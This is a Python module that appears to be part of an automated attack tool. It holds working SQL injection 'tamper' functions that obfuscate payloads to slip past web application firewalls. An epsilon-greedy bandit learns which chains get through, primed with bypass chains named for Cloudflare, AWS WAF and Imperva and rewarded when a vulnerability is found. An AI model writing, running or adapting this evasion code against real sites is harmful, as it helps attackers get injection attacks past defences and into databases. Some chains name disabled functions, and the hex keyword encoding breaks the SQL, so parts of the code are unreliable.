# -*- coding: utf-8 -*-
"""
WAF Evasion Engine (Tamper Scripts).

This module contains a collection of functions to modify SQLi payloads
and a learning-based selector to choose the most effective tamper chains.
"""
import random
import re
from urllib.parse import quote_plus, quote
from collections import defaultdict

# --- Individual Tamper Functions ---

def space_to_comment(payload: str) -> str:
    return payload.replace(" ", "/**/")

def random_case(payload: str) -> str:
    return "".join(random.choice([c.upper(), c.lower()]) for c in payload)

# ... All other tamper functions like plus_url_encode, char_double_encode, etc. go here ...
# (omitted for brevity, they are the same as before)
def plus_url_encode(payload: str) -> str: return quote_plus(payload)
def char_double_encode(payload: str) -> str: return "".join(f"%{ord(c):02x}" for c in quote(payload, safe=""))
def equal_to_like(payload: str) -> str: return payload.replace("=", " LIKE ")
def space_to_random_blank(payload: str) -> str:
    whitespace = ['%09', '%0a', '%0b', '%0c', '%0d']
    return "".join(random.choice(whitespace) if c == ' ' else c for c in payload)
def versioned_keywords(payload: str) -> str: return re.sub(r'(?i)\b(UNION|SELECT)\b', r'/*!50000\1*/', payload)
def keyword_substitution(payload: str) -> str: return payload.replace(" AND ", "&&").replace(" OR ", "||")
def hex_encode_keywords(payload: str) -> str:
    payload = re.sub(r'(?i)\b(SELECT)\b', '0x53454c454354', payload)
    return re.sub(r'(?i)\b(UNION)\b', '0x554e494f4e', payload)
def add_null_byte(payload: str) -> str: return payload + "%00"
def split_keywords_by_comment(payload: str) -> str:
    payload = re.sub(r'(?i)\b(union)\b', 'un/**/ion', payload)
    return re.sub(r'(?i)\b(select)\b', 'sel/**/ect', payload)
def function_synonyms(payload: str) -> str:
    payload = re.sub(r'(?i)\b(substring)\b', 'MID', payload)
    return re.sub(r'(?i)\b(benchmark)\b', 'SLEEP', payload)
def comment_around_keywords(payload: str) -> str:
    return re.sub(r'(?i)\b(SELECT|UNION|AND|OR|FROM)\b', r'/*\1*/', payload)


TAMPER_FUNCTIONS = {
    'space2comment': space_to_comment,
    'randomcase': random_case,
    # 'urlencode': plus_url_encode,  # Disabled: Playwright handles URL encoding.
    # 'chardoubleencode': char_double_encode,  # Disabled: Produces invalid payloads.
    'equaltolike': equal_to_like,
    # 'space2randomblank': space_to_random_blank,  # Disabled: Playwright handles URL encoding.
    'versionedkeywords': versioned_keywords,
    'keywordsubstitution': keyword_substitution,
    # 'hexencodekeywords': hex_encode_keywords,  # Disabled: Avoid manual encoding.
    # 'addnullbyte': add_null_byte,  # Disabled: Playwright handles URL encoding.
    'splitkeywords': split_keywords_by_comment,
    'functionsynonyms': function_synonyms,
    'commentaroundkeywords': comment_around_keywords,
}

# All encoding tampers are disabled, so exclusive groups are no longer needed.
MUTUALLY_EXCLUSIVE_TAMPERS = []

def apply_tampers(payload: str, tamper_list: list[str]) -> str:
    """Applies a list of tamper scripts to a payload sequentially."""
    for tamper_name in tamper_list:
        tamper_func = TAMPER_FUNCTIONS.get(tamper_name)
        if tamper_func:
            payload = tamper_func(payload)
    return payload

# --- Learning Tamper Selector (Multi-Armed Bandit) ---

# A map of WAF-specific tactics to prime the bandit.
# These are chains known to be effective against certain WAFs.
WAF_TTP = {
    "Cloudflare": [('versionedkeywords',), ('space2randomblank', 'randomcase')],
    "AWS WAF": [('space2comment',)],
    "Imperva (Incapsula)": [('urlencode', 'randomcase')],
}


class TamperSelector:
    """
    Selects the best tamper chain using a multi-armed bandit algorithm (Epsilon-Greedy).
    """
    def __init__(self, waf_name: str | None = None, epsilon=0.2):
        self.epsilon = epsilon
        self.chains = [
            (), ('space2comment',), ('randomcase', 'space2comment'), ('versionedkeywords',),
            ('space2randomblank', 'randomcase'), ('equaltolike',), ('hexencodekeywords', 'addnullbyte'),
            ('chardoubleencode',),
        ]
        # Stats store: { chain_tuple: {'value': float, 'count': int} }
        self.stats = defaultdict(lambda: {'value': 0.0, 'count': 0})

        # Prime the bandit with known TTPs for the detected WAF
        if waf_name and waf_name in WAF_TTP:
            print(f"[*] Priming tamper selector for WAF: {waf_name}")
            for chain in WAF_TTP[waf_name]:
                if chain not in self.chains:
                    self.chains.append(chain)
                # Give a small initial reward to encourage trying these chains
                self.stats[chain]['value'] = 0.5
                self.stats[chain]['count'] = 1 # Pretend we tried it once

    def select_chain(self) -> tuple[str, ...]:
        """
        Selects a tamper chain using Epsilon-Greedy strategy.
        - With probability epsilon, explores a random chain.
        - With probability 1-epsilon, exploits the best-known chain.
        """
        if random.random() < self.epsilon:
            # Exploration
            return random.choice(self.chains)
        else:
            # Exploitation
            if not self.stats:
                return random.choice(self.chains) # If no stats yet, explore
            # Select the chain with the highest value (average reward)
            best_chain = max(self.stats, key=lambda c: self.stats[c]['value'])
            return best_chain

    def update_stats(self, chain: tuple[str, ...], reward: float):
        """
        Updates the value and count for a given tamper chain.
        Reward: +1 for success (vuln found), -1 for block, 0 for neutral.
        """
        if chain not in self.chains:
            self.chains.append(chain) # Add new chains if discovered dynamically

        stat = self.stats[chain]
        # Update average reward using incremental formula: V_n = V_{n-1} + (R_n - V_{n-1}) / n
        new_value = stat['value'] + (reward - stat['value']) / (stat['count'] + 1)
        stat['value'] = new_value
        stat['count'] += 1

        # print(f"[DEBUG] Tamper chain {chain} updated. New value: {new_value:.2f}, Count: {stat['count']}")
